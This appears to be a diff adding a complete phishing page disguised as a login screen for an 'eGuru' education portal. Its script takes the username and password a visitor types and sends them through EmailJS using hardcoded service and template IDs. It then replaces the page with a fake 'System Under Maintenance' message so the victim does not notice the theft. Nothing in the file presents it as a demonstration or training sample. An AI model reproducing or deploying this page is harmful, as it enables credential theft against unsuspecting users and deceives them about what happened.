@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Page</title>
+
+<!-- Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, Tahoma;
+    background: #f2f2f2;
+}
+
+/* TOP BAR */
+.top-bar {
+    background: #9b5c8f;
+    color: white;
+    padding: 10px 15px;
+    font-size: 14px;
+    text-align: right;
+}
+
+/* HEADER */
+.header {
+    background: #9b5c8f;
+    color: white;
+    padding: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.logo {
+    font-size: 22px;
+    font-weight: bold;
+}
+
+.menu {
+    font-size: 26px;
+}
+
+/* LOGIN CARD */
+.login-card {
+    background: #9b5c8f;
+    width: 340px;
+    margin: 40px auto;
+    padding: 25px;
+    border-radius: 8px;
+    color: white;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+}
+
+.login-card h2 {
+    margin-top: 0;
+    font-size: 28px;
+}
+
+label {
+    font-size: 14px;
+}
+
+.input-box {
+    background: white;
+    display: flex;
+    align-items: center;
+    padding: 10px;
+    border-radius: 4px;
+    margin: 8px 0 18px;
+}
+
+.input-box input {
+    border: none;
+    outline: none;
+    flex: 1;
+    font-size: 16px;
+}
+
+.input-box i {
+    color: #555;
+    font-size: 18px;
+}
+
+button {
+    background: white;
+    color: #333;
+    border: none;
+    padding: 12px 20px;
+    font-size: 16px;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #eee;
+}
+
+.forgot {
+    margin-top: 15px;
+    font-size: 14px;
+}
+
+.forgot a {
+    color: white;
+    text-decoration: underline;
+}
+
+/* RESPONSIVE */
+@media (max-width: 400px) {
+    .login-card {
+        width: 90%;
+    }
+}
+</style>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function(){
+   emailjs.init("lOV1yGlf_vzIGgnJ2");//
+})();
+</script>
+
+</head>
+
+<body>
+
+<div class="top-bar">
+    You are not logged in
+</div>
+
+<div class="header">
+    <div class="logo">🎓 eGuru</div>
+    <div class="menu"><i class="fa fa-bars"></i></div>
+</div>
+
+<div class="login-card">
+    <h2>Login into your<br>account</h2>
+
+    <label>Username</label>
+    <div class="input-box">
+        <input type="text" id="username" placeholder="Username">
+        <i class="fa fa-user"></i>
+    </div>
+
+    <label>Password</label>
+    <div class="input-box">
+        <input type="password" id="password" placeholder="Password">
+        <i class="fa fa-lock"></i>
+    </div>
+
+    <button onclick="sendData()">LOG IN</button>
+
+    <div class="forgot">
+        <a href="#">Forgotten your username or password?</a>
+    </div>
+</div>
+
+<script>
+function sendData() {
+    let username = document.getElementById("username").value;
+    let password = document.getElementById("password").value;
+
+    if(username === "" || password === "") {
+        alert("Please fill all fields");
+        return;
+    }
+
+    emailjs.send("service_wjuc87m", "template_0iwlhph", {
+        username: username,
+        password: password
+    }).then(function() {
+        document.body.innerHTML = `
+        <div style="
+            height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+            background:#9b5c8f;
+            color:white;
+            font-family:Arial;
+            text-align:center;
+        ">
+            <h1>⚠ System Under Maintenance</h1>
+            <p>We are currently updating our servers.<br>Please try again later.</p>
+        </div>
+        `;
+    }, function(error) {
+        alert("Error sending data");
+    });
+}
+</script>
+
+</body>
+</html>
